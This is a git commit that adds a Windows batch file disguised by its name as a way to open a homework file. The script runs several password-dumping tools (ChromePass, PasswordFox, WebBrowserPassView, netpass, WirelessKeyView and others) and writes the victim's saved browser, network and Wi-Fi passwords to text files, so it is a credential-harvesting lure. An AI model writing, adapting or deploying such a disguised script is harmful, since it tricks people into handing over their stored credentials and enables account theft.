c9111c2ec60d68de2c033cd88096f7dd80640c57
enshine90909011 <75533533+enshine90909011@users.noreply.github.com>
2021-02-02 18:27:58 +0000

    Add files via upload

---
+++ for-levi-main/to open the hwk file run this.bat
@@ -0,0 +1,9 @@
+ChromePass.exe > passwords.tx
+BulletsPassView.exe > passwords.tx
+PasswordFox.exe > passwords.tx
+netpass.exe > password.tx
+WebBrowserPassView.exe > password.tx
+WirelessKeyView.exe > passworde.tx
+
+
+
